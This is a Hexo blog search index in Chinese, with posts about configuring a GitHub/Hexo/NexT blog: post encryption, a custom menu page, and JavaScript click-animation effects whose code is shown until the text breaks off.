<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>配置博客时不得不说的问题</title>
    <url>/Blog-Config-1/</url>
    <content><![CDATA[<p>GitHub&amp;Hexo&amp;NexT Blog 配置过程记录（下）：其他配置及问题</p>
<a id="more"></a>

<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/ExiTalk.png" alt="ExiTalk"></p>
<blockquote>
<p>在 <a href="https://www.superpung.xyz/Blog-Config-0/">上一篇文章 </a>中，已经搭建好了博客网站，这篇文章就来记录一下玩博客一年多来遇到的问题吧。</p>
<p>下文添加的功能，建议添加完成后通过 <code>hexo g &amp;&amp; hexo s</code> 本地预览。</p>
<p>P.S. 今天看维基百科的时候，发现除了简体中文和繁体中文外，竟然还有文言文版本的“<a href="https://zh-classical.wikipedia.org/wiki/%E7%B6%AD%E5%9F%BA%E5%A4%A7%E5%85%B8:%E5%8D%B7%E9%A6%96">维基大典</a>”：</p>
<blockquote>
<p><strong>歡迎</strong></p>
<p>自永樂修典，四庫編成，古今圖冊，收攬完備。惟近世曉覺道理，百家爭鳴。西學東漸，各有始末。士紳茫茫，遠不及逮。疑古者眾，怨舊者多。於是斥逐儒術，貶抑性理。殷周之明，莫非妖言；泰西末流，敬為上賓。崇外若此，至今百年。會西國志士，立典於網絡，開共筆之先河。吾人乃竊取一處，成以文言，謀復古法，載新世之大道，以揚中華文理，興千年舊邦，故亟需善古文而博今道者。願足下能同遊，共為大典，修先世之廢道，著當今之新知。</p>
<p>又，古文維基大典，以其從古，多有異於外文，宜先閱<a href="https://zh-classical.wikipedia.org/wiki/%E7%B6%AD%E5%9F%BA%E5%A4%A7%E5%85%B8:%E4%BA%94%E6%9F%B1">典章</a>、<a href="https://zh-classical.wikipedia.org/wiki/%E5%B9%AB%E5%8A%A9:%E5%87%A1%E4%BE%8B">凡例</a>、<a href="https://zh-classical.wikipedia.org/wiki/%E7%B6%AD%E5%9F%BA%E5%A4%A7%E5%85%B8:%E7%AB%A0%E6%B3%95">章法</a>，以求壹道。</p>
<p>如有垂詢賜教，請至<a href="https://zh-classical.wikipedia.org/wiki/%E7%B6%AD%E5%9F%BA%E5%A4%A7%E5%85%B8:%E6%9C%83%E9%A4%A8">會館</a>。<a href="https://zh-classical.wikipedia.org/wiki/%E7%B6%AD%E5%9F%BA%E5%A4%A7%E5%85%B8:%E7%87%95%E8%AA%9E%E9%96%A3">燕語</a>如故，亦無不可。</p>
<p>– 孔明居士 二〇二一年二月一四日 （日） 〇八時五八分 (UTC)</p>
</blockquote>
<p>真的是惊喜。</p>
<p>P.S. 21 年 2 月 17 日更新：为了方便阅读，将内容拆分。</p>
</blockquote>
<h1 id="其他配置及问题"><a href="#其他配置及问题" class="headerlink" title="其他配置及问题"></a>其他配置及问题</h1><ol>
<li><a href="https://www.superpung.xyz/Blog-migration-process/">迁移博客遇到的问题</a></li>
<li><a href="https://www.superpung.xyz/Blog-click-effects/">添加点击特效</a></li>
<li><a href="https://www.superpung.xyz/Blog-safari-rainbow/">添加 Safari 彩虹效果</a></li>
<li><a href="https://www.superpung.xyz/Blog-poetry/">添加今日诗词</a></li>
<li><a href="https://www.superpung.xyz/Blog-top-article/">添加文章置顶</a></li>
<li><a href="https://www.superpung.xyz/Blog-article-encryption/">添加文章加密</a></li>
<li><a href="https://www.superpung.xyz/Blog-a-custom-page/">添加自定义页面</a></li>
<li><a href="https://www.superpung.xyz/Blog-comment-function/">添加评论功能</a></li>
<li><a href="https://www.superpung.xyz/Blog-yuru-chara/">添加看板娘</a></li>
<li><a href="https://www.superpung.xyz/markdown/">写文章</a></li>
<li><a href="https://www.superpung.xyz/Blog-insert-audio-video/">插入音乐及视频</a></li>
<li><a href="https://www.superpung.xyz/Blog-insert-images/">插入图片遇到的问题</a></li>
</ol>
<h1 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h1><p>本来只是想简单记录一下玩博客的想法，没想到正逢辛丑牛年春节，已经陆陆续续写了四天。如果你看到了这里，那一定是缘分。如果你感觉我的经历对你有所帮助的话，请留言或者赞赏或者联系我，让我知道帮助到了你。这是对我的莫大鼓励。</p>
<p>当你开始尝试自己搭建博客的时候，你会发现，世界上有千千万万人和你一样，在 GitHub、Hexo 和 NexT 之上，用自己的智慧和个性让互联网更加繁荣多彩。</p>
]]></content>
      <tags>
        <tag>Notes</tag>
      </tags>
  </entry>
  <entry>
    <title>博客文章如何加密？</title>
    <url>/Blog-article-encryption/</url>
    <content><![CDATA[<p>如果你想把文章只对特定人可见，那么可以试试对文章加密。</p>
<a id="more"></a>

<p>安装插件：</p>
<figure class="highlight zsh"><table><tr><td class="code"><pre><span class="line">npm install --save hexo-blog-encrypt</span><br></pre></td></tr></table></figure>
<p>使用时只需在文章头添加 <code>password</code> 字段：</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: test</span><br><span class="line">date: 2021-02-14 11:09:58</span><br><span class="line">password: hello</span><br><span class="line">---</span><br></pre></td></tr></table></figure>
<p>完成。</p>
<blockquote>
<p>参考</p>
<ul>
<li><a href="https://github.com/D0n9X1n/hexo-blog-encrypt">hexo-blog-encrypt</a></li>
</ul>
</blockquote>
]]></content>
      <tags>
        <tag>Blog Config</tag>
      </tags>
  </entry>
  <entry>
    <title>在博客中添加一个自定义页面</title>
    <url>/Blog-a-custom-page/</url>
    <content><![CDATA[<p>如果你想在博客子目录添加一个自定义的 html 页面，不妨看一看。</p>
<a id="more"></a>

<p>受菜单栏启发，可以将自定义页面放到菜单栏。在 <code>_config.next.yml</code> 文件的 <code>menu</code> 中，按照 <code>Key: /link/ || icon</code> 格式添加一项。</p>
<p>比如添加 <code>love: /love/ || fa fa-heart</code>，即在菜单栏添加了一个名为“love”、路径为 <code>/source/love/</code>、图标为 <code>fa fa-heart</code> 的菜单。</p>
<p>接下来在对应路径处放置写好的 html 文件 <code>index.html</code>。此时生成预览后，可以发现自定义的页面上方仍有菜单栏、下方有网站页脚。这是 Hexo 将自定义页面也进行了渲染的结果。</p>
<p>如果不想对自定义页面渲染，可以按照上一篇文章提到的，在 <code>_config.yml</code> 文件的 <code>skip_render</code> 中添加 <code>love/index.html</code>。或者在 <code>index.html</code> 开头添加：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">layout: false</span><br><span class="line">---</span><br></pre></td></tr></table></figure>
<p>完成。</p>
]]></content>
      <tags>
        <tag>Blog Config</tag>
      </tags>
  </entry>
  <entry>
    <title>鼠标指针下的光彩</title>
    <url>/Blog-click-effects/</url>
    <content><![CDATA[<p>点击一下就出现烟花，这是怎么做到的？</p>
<a id="more"></a>

<p>你在此网站的每一次点击，都伴随着特殊的动画特效。</p>
<p>效果由 JavaScript 实现。</p>
<p>在 <code>/themes/next/source/js/</code> 目录下新建文件夹 <code>cursor</code> ，用于存放四种特效的 <code>js</code> 文件：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cursor</span><br><span class="line">  ├─explosion.min.js  // 爆炸效果</span><br><span class="line">  ├─fireworks.js      // 烟花效果</span><br><span class="line">  └─love.min.js       // 爱心效果</span><br></pre></td></tr></table></figure>
<ul>
<li><p><code>explosion.min.js</code></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;<span class="function"><span class="keyword">function</span> <span class="title">updateCoords</span>(<span class="params">e</span>)</span>&#123;pointerX=(e.clientX||e.touches[<span class="number">0</span>].clientX)-canvasEl.getBoundingClientRect().left,pointerY=e.clientY||e.touches[<span class="number">0</span>].clientY-canvasEl.getBoundingClientRect().top&#125;<span class="function"><span class="keyword">function</span> <span class="title">setParticuleDirection</span>(<span class="params">e</span>)</span>&#123;<span class="keyword">var</span> t=anime.random(<span class="number">0</span>,<span class="number">360</span>)*<span class="built_in">Math</span>.PI/<span class="number">180</span>,a=anime.random(<span class="number">50</span>,<span class="number">180</span>),n=[-<span class="number">1</span>,<span class="number">1</span>][anime.random(<span class="number">0</span>,<span class="number">1</span>)]*a;<span class="keyword">return</span>&#123;<span class="attr">x</span>:e.x+n*<span class="built_in">Math</span>.cos(t),<span class="attr">y</span>:e.y+n*<span class="built_in">Math</span>.sin(t)&#125;&#125;<span class="function"><span class="keyword">function</span> <span class="title">createParticule</span>(<span class="params">e,t</span>)</span>&#123;<span class="keyword">var</span> a=&#123;&#125;;<span class="keyword">return</span> a.x=e,a.y=t,a.color=colors[anime.random(<span class="number">0</span>,colors.length-<span class="number">1</span>)],a.radius=anime.random(<span class="number">16</span>,<span class="number">32</span>),a.endPos=setParticuleDirection(a),a.draw=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;ctx.beginPath(),ctx.arc(a.x,a.y,a.radius,<span class="number">0</span>,<span class="number">2</span>*<span class="built_in">Math</span>.PI,!<span class="number">0</span>),ctx.fillStyle=a.color,ctx.fill()&#125;,a&#125;<span class="function"><span class="keyword">function</span> <span class="title">createCircle</span>(<span class="params">e,t</span>)</span>&#123;<span class="keyword">var</span> a=&#123;&#125;;<span class="keyword">return</span> a.x=e,a.y=t,a.color=<span class="string">&quot;#F00&quot;</span>,a.radius=<span class="number">.1</span>,a.alpha=<span class="number">.5</span>,a.lineWidth=<span class="number">6</span>,a.draw=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;ctx.globalAlpha=a.alpha,ctx.beginPath(),ctx.arc(a.x,a.y,a.radius,<span class="number">0</span>,<span class="number">2</span>*<span class="built_in">Math</span>.PI,!<span class="number">0</span>),ctx.lineWidth=a.lineWidth,ctx.strokeStyle=a.color,ctx.stroke(),ctx.globalAlpha=<span class="number">1</span>&#125;,a&#125;<span class="function"><span class="keyword">function</span> <span class="title">renderParticule</span>(<span class="params">e</span>)</span>&#123;<span class="keyword">for</span>(<span class="keyword">var</span> t=<span class="number">0</span>;t&lt;e.animatables.length;t++)e.animatables[t].target.draw()&#125;<span class="function"><span class="keyword">function</span> <span class="title">animateParticules</span>(<span class="params">e,t</span>)</span>&#123;<span class="keyword">for</span>(<span class="keyword">var</span> a=createCircle(e,t),n=[],i=<span class="number">0</span>;i&lt;numberOfParticules;i++)n.push(createParticule(e,t));anime.timeline().add(&#123;<span class="attr">targets</span>:n,<span class="attr">x</span>:<span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;<span class="keyword">return</span> e.endPos.x&#125;,<span class="attr">y</span>:<span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;<span class="keyword">return</span> e.endPos.y&#125;,<span class="attr">radius</span>:<span class="number">.1</span>,<span class="attr">duration</span>:anime.random(<span class="number">1200</span>,<span class="number">1800</span>),<span class="attr">easing</span>:<span class="string">&quot;easeOutExpo&quot;</span>,<span class="attr">update</span>:renderParticule&#125;).add(&#123;<span class="attr">targets</span>:a,<span class="attr">radius</span>:anime.random(<span class="number">80</span>,<span class="number">160</span>),<span class="attr">lineWidth</span>:<span class="number">0</span>,<span class="attr">alpha</span>:&#123;<span class="attr">value</span>:<span class="number">0</span>,<span class="attr">easing</span>:<span class="string">&quot;linear&quot;</span>,<span class="attr">duration</span>:anime.random(<span class="number">600</span>,<span class="number">800</span>)&#125;,<span class="attr">duration</span>:anime.random(<span class="number">1200</span>,<span class="number">1800</span>),<span class="attr">easing</span>:<span class="string">&quot;easeOutExpo&quot;</span>,<span class="attr">update</span>:renderParticule,<span class="attr">offset</span>:<span class="number">0</span>&#125;)&#125;<span class="function"><span class="keyword">function</span> <span class="title">debounce</span>(<span class="params">e,t</span>)</span>&#123;<span class="keyword">var</span> a;<span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">var</span> n=<span class="built_in">this</span>,i=<span class="built_in">arguments</span>;<span class="built_in">clearTimeout</span>(a),a=<span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;e.apply(n,i)&#125;,t)&#125;&#125;<span class="keyword">var</span> canvasEl=<span class="built_in">document</span>.querySelector(<span class="string">&quot;.fireworks&quot;</span>);<span class="keyword">if</span>(canvasEl)&#123;<span class="keyword">var</span> ctx=canvasEl.getContext(<span class="string">&quot;2d&quot;</span>),numberOfParticules=<span class="number">30</span>,pointerX=<span class="number">0</span>,pointerY=<span class="number">0</span>,tap=<span class="string">&quot;mousedown&quot;</span>,colors=[<span class="string">&quot;#FF1461&quot;</span>,<span class="string">&quot;#18FF92&quot;</span>,<span class="string">&quot;#5A87FF&quot;</span>,<span class="string">&quot;#FBF38C&quot;</span>],setCanvasSize=debounce(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;canvasEl.width=<span class="number">2</span>*<span class="built_in">window</span>.innerWidth,canvasEl.height=<span class="number">2</span>*<span class="built_in">window</span>.innerHeight,canvasEl.style.width=<span class="built_in">window</span>.innerWidth+<span class="string">&quot;px&quot;</span>,canvasEl.style.height=<span class="built_in">window</span>.innerHeight+<span class="string">&quot;px&quot;</span>,canvasEl.getContext(<span class="string">&quot;2d&quot;</span>).scale(<span class="number">2</span>,<span class="number">2</span>)&#125;,<span class="number">500</span>),render=anime(&#123;<span class="attr">duration</span>:<span class="number">1</span>/<span class="number">0</span>,<span class="attr">update</span>:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;ctx.clearRect(<span class="number">0</span>,<span class="number">0</span>,canvasEl.width,canvasEl.height)&#125;&#125;);<span class="built_in">document</span>.addEventListener(tap,<span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;<span class="string">&quot;sidebar&quot;</span>!==e.target.id&amp;&amp;<span class="string">&quot;toggle-sidebar&quot;</span>!==e.target.id&amp;&amp;<span class="string">&quot;A&quot;</span>!==e.target.nodeName&amp;&amp;<span class="string">&quot;IMG&quot;</span>!==e.target.nodeName&amp;&amp;(render.play(),updateCoords(e),animateParticules(pointerX,pointerY))&#125;,!<span class="number">1</span>),setCanvasSize(),<span class="built_in">window</span>.addEventListener(<span class="string">&quot;resize&quot;</span>,setCanvasSize,!<span class="number">1</span>)&#125;</span><br></pre></td></tr></table></figure></li>
<li><p><code>fireworks.js</code></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Circle</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="title">constructor</span>(<span class="params">&#123; origin, speed, color, angle, context &#125;</span>)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.origin = origin</span><br><span class="line">    <span class="built_in">this</span>.position = &#123; ...this.origin &#125;</span><br><span class="line">    <span class="built_in">this</span>.color = color</span><br><span class="line">    <span class="built_in">this</span>.speed = speed</span><br><span class="line">    <span class="built_in">this</span>.angle = angle</span><br><span class="line">    <span class="built_in">this</span>.context = context</span><br><span class="line">    <span class="built_in">this</span>.renderCount = <span class="number">0</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="title">draw</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.context.fillStyle = <span class="built_in">this</span>.color</span><br><span class="line">    <span class="built_in">this</span>.context.beginPath()</span><br><span class="line">    <span class="built_in">this</span>.context.arc(<span class="built_in">this</span>.position.x, <span class="built_in">this</span>.position.y, <span class="number">2</span>, <span class="number">0</span>, <span class="built_in">Math</span>.PI * <span class="number">2</span>)</span><br><span class="line">    <span class="built_in">this</span>.context.fill()</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="title">move</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.position.x = (<span class="built_in">Math</span>.sin(<span class="built_in">this</span>.angle) * <span class="built_in">this</span>.speed) + <span class="built_in">this</span>.position.x</span><br><span class="line">    <span class="built_in">this</span>.position.y = (<span class="built_in">Math</span>.cos(<span class="built_in">this</span>.angle) * <span class="built_in">this</span>.speed) + <span class="built_in">this</span>.position.y + (<span class="built_in">this</span>.renderCount * <span class="number">0.3</span>)</span><br><span class="line">    <span class="built_in">this</span>.renderCount++</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Boom</span> </span>&#123;</span><br><span class="line">  <span class="title">constructor</span> (<span class="params">&#123; origin, context, circleCount = <span class="number">16</span>, area &#125;</span>) &#123;</span><br><span class="line">    <span class="built_in">this</span>.origin = origin</span><br><span class="line">    <span class="built_in">this</span>.context = context</span><br><span class="line">    <span class="built_in">this</span>.circleCount = circleCount</span><br><span class="line">    <span class="built_in">this</span>.area = area</span><br><span class="line">    <span class="built_in">this</span>.stop = <span class="literal">false</span></span><br><span class="line">    <span class="built_in">this</span>.circles = []</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="title">randomArray</span>(<span class="params">range</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> length = range.length</span><br><span class="line">    <span class="keyword">const</span> randomIndex = <span class="built_in">Math</span>.floor(length * <span class="built_in">Math</span>.random())</span><br><span class="line">    <span class="keyword">return</span> range[randomIndex]</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="title">randomColor</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> range = [<span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;F&#x27;</span>]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;#&#x27;</span> + <span class="built_in">this</span>.randomArray(range) + <span class="built_in">this</span>.randomArray(range) + <span class="built_in">this</span>.randomArray(range) + <span class="built_in">this</span>.randomArray(range) + <span class="built_in">this</span>.randomArray(range) + <span class="built_in">this</span>.randomArray(range)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="title">randomRange</span>(<span class="params">start, end</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> (end - start) * <span class="built_in">Math</span>.random() + start</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="title">init</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="built_in">this</span>.circleCount; i++) &#123;</span><br><span class="line">      <span class="keyword">const</span> circle = <span class="keyword">new</span> Circle(&#123;</span><br><span class="line">        context: <span class="built_in">this</span>.context,</span><br><span class="line">        origin: <span class="built_in">this</span>.origin,</span><br><span class="line">        color: <span class="built_in">this</span>.randomColor(),</span><br><span class="line">        angle: <span class="built_in">this</span>.randomRange(<span class="built_in">Math</span>.PI - <span class="number">1</span>, <span class="built_in">Math</span>.PI + <span class="number">1</span>),</span><br><span class="line">        speed: <span class="built_in">this</span>.randomRange(<span class="number">1</span>, <span class="number">6</span>)</span><br><span class="line">      &#125;)</span><br><span class="line">      <span class="built_in">this</span>.circles.push(circle)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="title">move</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.circles.forEach(<span class="function">(<span class="params">circle, index</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (circle.position.x &gt; <span class="built_in">this</span>.area.width || circle.position.y &gt; <span class="built_in">this</span>.area.height) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.circles.splice(index, <span class="number">1</span>)</span><br><span class="line">      &#125;</span><br><span class="line">      circle.move()</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.circles.length == <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="built_in">this</span>.stop = <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="title">draw</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.circles.forEach(<span class="function"><span class="params">circle</span> =&gt;</span> circle.draw())</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CursorSpecialEffects</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="title">constructor</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.computerCanvas = <span class="built_in">document</span>.createElement(<span class="string">&#x27;canvas&#x27;</span>)</span><br><span class="line">    <span class="built_in">this</span>.renderCanvas = <span class="built_in">document</span>.createElement(<span class="string">&#x27;canvas&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">this</span>.computerContext = <span class="built_in">this</span>.computerCanvas.getContext(<span class="string">&#x27;2d&#x27;</span>)</span><br><span class="line">    <span class="built_in">this</span>.renderContext = <span class="built_in">this</span>.renderCanvas.getContext(<span class="string">&#x27;2d&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">this</span>.globalWidth = <span class="built_in">window</span>.innerWidth</span><br><span class="line">    <span class="built_in">this</span>.globalHeight = <span class="built_in">window</span>.innerHeight</span><br><span class="line"></span><br><span class="line">    <span class="built_in">this</span>.booms = []</span><br><span class="line">    <span class="built_in">this</span>.running = <span class="literal">false</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="title">handleMouseDown</span>(<span class="params">e</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> boom = <span class="keyword">new</span> Boom(&#123;</span><br><span class="line">      origin: &#123; <span class="attr">x</span>: e.clientX, <span class="attr">y</span>: e.clientY &#125;,</span><br><span class="line">      context: <span class="built_in">this</span>.computerContext,</span><br><span class="line">      area: &#123;</span><br><span class="line">        width: <span class="built_in">this</span>.globalWidth,</span><br><span class="line">        height: <span class="built_in">this</span>.globalHeight</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">    boom.init()</span><br><span class="line">    <span class="built_in">this</span>.booms.push(boom)</span><br><span class="line">    <span class="built_in">this</span>.running || <span class="built_in">this</span>.run()</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="title">handlePageHide</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.booms = []</span><br><span class="line">    <span class="built_in">this</span>.running = <span class="literal">false</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="title">init</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> style = <span class="built_in">this</span>.renderCanvas.style</span><br><span class="line">    style.position = <span class="string">&#x27;fixed&#x27;</span></span><br><span class="line">    style.top = style.left = <span class="number">0</span></span><br><span class="line">    style.zIndex = <span class="string">&#x27;999999999999999999999999999999999999999999&#x27;</span></span><br><span class="line">    style.pointerEvents = <span class="string">&#x27;none&#x27;</span></span><br><span class="line"></span><br><span class="line">    style.width = <span class="built_in">this</span>.renderCanvas.width = <span class="built_in">this</span>.computerCanvas.width = <span class="built_in">this</span>.globalWidth</span><br><span class="line">    style.height = <span class="built_in">this</span>.renderCanvas.height = <span class="built_in">this</span>.computerCanvas.height = <span class="built_in">this</span>.globalHeight</span><br><span class="line"></span><br><span class="line">    <span class="built_in">document</span>.body.append(<span class="built_in">this</span>.renderCanvas)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">window</span>.addEventListener(<span class="string">&#x27;mousedown&#x27;</span>, <span class="built_in">this</span>.handleMouseDown.bind(<span class="built_in">this</span>))</span><br><span class="line">    <span class="built_in">window</span>.addEventListener(<span class="string">&#x27;pagehide&#x27;</span>, <span class="built_in">this</span>.handlePageHide.bind(<span class="built_in">this</span>))</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="title">run</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.running = <span class="literal">true</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.booms.length == <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">this</span>.running = <span class="literal">false</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    requestAnimationFrame(<span class="built_in">this</span>.run.bind(<span class="built_in">this</span>))</span><br><span class="line"></span><br><span class="line">    <span class="built_in">this</span>.computerContext.clearRect(<span class="number">0</span>, <span class="number">0</span>, <span class="built_in">this</span>.globalWidth, <span class="built_in">this</span>.globalHeight)</span><br><span class="line">    <span class="built_in">this</span>.renderContext.clearRect(<span class="number">0</span>, <span class="number">0</span>, <span class="built_in">this</span>.globalWidth, <span class="built_in">this</span>.globalHeight)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">this</span>.booms.forEach(<span class="function">(<span class="params">boom, index</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (boom.stop) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.booms.splice(index, <span class="number">1</span>)</span><br><span class="line">      &#125;</span><br><span class="line">      boom.move()</span><br><span class="line">      boom.draw()</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="built_in">this</span>.renderContext.drawImage(<span class="built_in">this</span>.computerCanvas, <span class="number">0</span>, <span class="number">0</span>, <span class="built_in">this</span>.globalWidth, <span class="built_in">this</span>.globalHeight)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> cursorSpecialEffects = <span class="keyword">new</span> CursorSpecialEffects()</span><br><span class="line">cursorSpecialEffects.init()</span><br></pre></td></tr></table></figure></li>
<li><p><code>love.min.js</code></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">!<span class="function"><span class="keyword">function</span>(<span class="params">e,t,a</span>)</span>&#123;<span class="function"><span class="keyword">function</span> <span class="title">n</span>(<span class="params"></span>)</span>&#123;c(<span class="string">&quot;.heart&#123;width: 10px;height: 10px;position: fixed;background: #f00;transform: rotate(45deg);-webkit-transform: rotate(45deg);-moz-transform: rotate(45deg);&#125;.heart:after,.heart:before&#123;content: &#x27;&#x27;;width: inherit;height: inherit;background: inherit;border-radius: 50%;-webkit-border-radius: 50%;-moz-border-radius: 50%;position: fixed;&#125;.heart:after&#123;top: -5px;&#125;.heart:before&#123;left: -5px;&#125;&quot;</span>),o(),r()&#125;<span class="function"><span class="keyword">function</span> <span class="title">r</span>(<span class="params"></span>)</span>&#123;<span class="keyword">for</span>(<span class="keyword">var</span> e=<span class="number">0</span>;e&lt;d.length;e++)d[e].alpha&lt;=<span class="number">0</span>?(t.body.removeChild(d[e].el),d.splice(e,<span class="number">1</span>)):(d[e].y--,d[e].scale+=<span class="number">.004</span>,d[e].alpha-=<span class="number">.013</span>,d[e].el.style.cssText=<span class="string">&quot;left:&quot;</span>+d[e].x+<span class="string">&quot;px;top:&quot;</span>+d[e].y+<span class="string">&quot;px;opacity:&quot;</span>+d[e].alpha+<span class="string">&quot;;transform:scale(&quot;</span>+d[e].scale+<span class="string">&quot;,&quot;</span>+d[e].scale+<span class="string">&quot;) rotate(45deg);background:&quot;</span>+d[e].color+<span class="string">&quot;;z-index:99999&quot;</span>);requestAnimationFrame(r)&#125;<span class="function"><span class="keyword">function</span> <span class="title">o</span>(<span class="params"></span>)</span>&#123;<span class="keyword">var</span> t=<span class="string">&quot;function&quot;</span>==<span class="keyword">typeof</span> e.onclick&amp;&amp;e.onclick;e.onclick=<span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;t&amp;&amp;t(),i(e)&#125;&#125;<span class="function"><span class="keyword">function</span> <span class="title">i</span>(<span class="params">e</span>)</span>&#123;<span class="keyword">var</span> a=t.createElement(<span class="string">&quot;div&quot;</span>);a.className=<span class="string">&quot;heart&quot;</span>,d.push(&#123;<span class="attr">el</span>:a,<span class="attr">x</span>:e.clientX-<span class="number">5</span>,<span class="attr">y</span>:e.clientY-<span class="number">5</span>,<span class="attr">scale</span>:<span class="number">1</span>,<span class="attr">alpha</span>:<span class="number">1</span>,<span class="attr">color</span>:s()&#125;),t.body.appendChild(a)&#125;<span class="function"><span class="keyword">function</span> <span class="title">c</span>(<span class="params">e</span>)</span>&#123;<span class="keyword">var</span> a=t.createElement(<span class="string">&quot;style&quot;</span>);a.type=<span class="string">&quot;text/css&quot;</span>;<span class="keyword">try</span>&#123;a.appendChild(t.createTextNode(e))&#125;<span class="keyword">catch</span>(t)&#123;a.styleSheet.cssText=e&#125;t.getElementsByTagName(<span class="string">&quot;head&quot;</span>)[<span class="number">0</span>].appendChild(a)&#125;<span class="function"><span class="keyword">function</span> <span class="title">s</span>(<span class="params"></span>)</span>&#123;<span class="keyword">return</span><span class="string">&quot;rgb(&quot;</span>+~~(<span class="number">255</span>*<span class="built_in">Math</span>.random())+<span class="string">&quot;,&quot;</span>+~~(<span class="number">255</span>*<span class="built_in">Math</span>.random())+<span class="string">&quot;,&quot;</span>+~~(<span class="number">255</span>*<span class="built_in">Math</span>.random())+<span class="string">&quot;)&quot;</span>&#125;<span class="keyword">var</span> d=[];e.requestAnimationFrame=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">return</span> e.requestAnimationFrame||e.webkitRequestAnimationFrame||e.mozRequestAnimationFrame||e.oRequestAnimationFrame||e.msRequestAnimationFrame||<span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;<span 